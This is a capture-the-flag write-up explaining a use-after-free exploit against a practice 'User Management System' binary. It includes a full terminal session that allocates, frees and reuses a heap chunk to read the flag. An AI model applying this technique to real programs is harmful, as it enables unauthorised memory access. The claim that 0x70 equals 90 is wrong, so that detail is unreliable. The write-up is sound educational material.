## Nothing is free

As the title suggests, it is a simple [use after free](https://en.wikipedia.org/wiki/Dangling_pointer) vulnerability. Where the user has to exploit the allocated memory after it has been freed, to get the flag.

Looking at the source code, we can see that the program asks for the size of the block to allocate. & the memory size allocated to the flag is 0x70 ie. 90.

So, we'll initially allocate a block of size 90 to index 2(can be any other as well) and put something random, then free its memory contents.

Then we'll load the flag into the memory using command "4".

The program will allocate the memory at the same address we allocated earlier, since the size of both blocks is same to same time.

hence, the flag will get loaded in index 2. because the index_2 pointer will still point to the same location. (we didn't set the pointer to 0)

then we'll just print the flag.

here's how it goes

```
➜ ./pwn2
Welcome to User Management System!
You can add, remove, edit, and view users.
Note: Maximum 12 users can be added.

1. Add User
2. Remove User
3. View Users
4. load flag
5. Exit
Enter your choice:1
Enter index:2
Enter input size:90
Enter name of the user:sharnctf
User added !!

1. Add User
2. Remove User
3. View Users
4. load flag
5. Exit
Enter your choice:2
Enter index of the user to remove:2
User Deleted !!

1. Add User
2. Remove User
3. View Users
4. load flag
5. Exit
Enter your choice:4
[*] flag loaded into memory

1. Add User
2. Remove User
3. View Users
4. load flag
5. Exit
Enter your choice:3
Enter index:2
Name : pclub{Th15_w45_50me_h34p_us3_4ft3r_fr33_x0x0}

1. Add User
2. Remove User
3. View Users
4. load flag
5. Exit
Enter your choice:5
Exiting...
```